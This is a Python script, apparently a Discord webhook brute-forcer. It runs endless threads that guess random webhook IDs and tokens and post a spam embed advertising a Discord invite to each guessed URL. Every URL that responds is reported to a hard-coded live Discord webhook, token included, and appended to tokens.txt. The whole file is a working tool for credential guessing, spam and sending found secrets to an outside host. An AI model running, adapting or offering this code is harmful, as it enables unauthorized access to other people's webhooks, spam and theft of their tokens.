import os 
os.system('pip install requests')
os.system('pip install json')
os.system('pip install random')
os.system('pip install string')
os.system('pip install secrets')
os.system('pip install time')
os.system('pip install threading')
os.system('cls')

import requests
import json
import random
import string

def HMAC(chars = string.ascii_uppercase + string.digits, N=68):
    return ''.join(random.choice(chars) for _ in range(N))

def timest(chars = string.ascii_uppercase + string.digits, N=68):
    return ''.join(random.choice(chars) for _ in range(N))

import secrets
import time
from threading import Thread

def write(token):
    try:
        webhook_url = 'https://discord.com/api/webhooks/1226916736260112496/NrHjwqxnXdhlg2Ihqa300U04ZABVX4o-vnJ0Daq5Y4WguEH1M7L2N9IymeljYhIlUwUr'

        embed = {
            "title": "New webhook!",
            "description": str("Url: "+str(token)),
            "color": random.randint(0, 0xFFFFFF)  # Цвет (здесь красный)
        }

        payload = {
            "embeds": [embed]
        }

        headers = {
            "Content-Type": "application/json"
        }

        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

    except: pass

    try:
        with open("tokens.txt", "a") as file:
            file.write(token + 'n')
    except: pass

def send_embed_message(token):

    id = int(random.randint(10**18, 10**19 - 1))

    if id <= 9223372036854775807:
        for i in [str(token)[:67], str(token)[:68], str(token)]:
            webhook_url = str(str("https://discord.com/api/webhooks/"+str(id)[:19]+"/"+str(i)).replace(" ", "")) + 'n'

            try:
                embed = {
                    "title": "Hey, you can find new projects!",
                    "description": "Come in here: https://discord.gg/WjGS2Q8h5G",
                    "color": random.randint(0, 0xFFFFFF)  # Цвет (здесь красный)
                }

                payload = {
                    "embeds": [embed]
                }

                headers = {
                    "Content-Type": "application/json"
                }

                response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

                if response.status_code == 204:
                    write(webhook_url)
                    print("Сообщение успешно отправлено в виде Embed!")
            except:
                print(webhook_url)
                write(webhook_url)

def generate_token(length):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"
    token = ''.join(random.choice(characters) for i in range(length))
    return token


def generate():
    ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"

    for i in range(69):
        token = generate_token(i)

    send_embed_message(token)

def generatev():
    ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"

    for i in range(1, 69):
        part1 = i
        part2 = 69 - i
        if part1 + part2 == 69:
            token = timest(chars=ts, N=part2) + HMAC(chars=ts, N=part1)

    send_embed_message(token)

def generateb():
    alphabet = string.ascii_letters + string.digits
    token = ''.join(random.choice(alphabet) for _ in range(69))

    send_embed_message(token)

def generaten():
    token = secrets.token_urlsafe(51)

    send_embed_message(token)



print('work')
write('work server 3 !')
while True:
    def main():
        num = [generatev, generateb, generaten]
        try:
            threads = []

            for i in num:
                time.sleep(random.randint(0,20))

                thread = Thread(target=i)
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        except: print('no')

    if __name__ == "__main__":
        main()

